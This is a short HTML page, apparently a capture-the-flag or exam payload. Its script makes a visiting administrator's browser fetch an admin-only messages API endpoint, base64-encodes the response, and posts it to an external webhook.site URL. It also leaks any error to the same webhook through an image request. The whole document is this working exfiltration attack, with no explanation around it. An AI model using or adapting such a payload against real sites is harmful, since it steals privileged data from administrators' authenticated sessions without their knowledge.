<!DOCTYPE html>
<html>
<body>
    <script>
        // Use the successful path and your NEW message ID
        const targetPath = '/api/admin/messages/69ea9c01bee6d6b7c66465d7';
        const myWebhook = 'https://webhook.site/296afaf2-cf3b-4b7e-9e97-f597328a7eb7';

        fetch(targetPath)
            .then(response => response.text())
            .then(data => {
                // Send the result to your new webhook
                fetch(myWebhook, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: btoa('EXAM_FLAG_RESULT:' + data)
                });
            })
            .catch(err => {
                // Log if the admin can't reach the API from your link
                new Image().src = myWebhook + '?error=' + btoa(err.message);
            });
    </script>
</body>
</html>
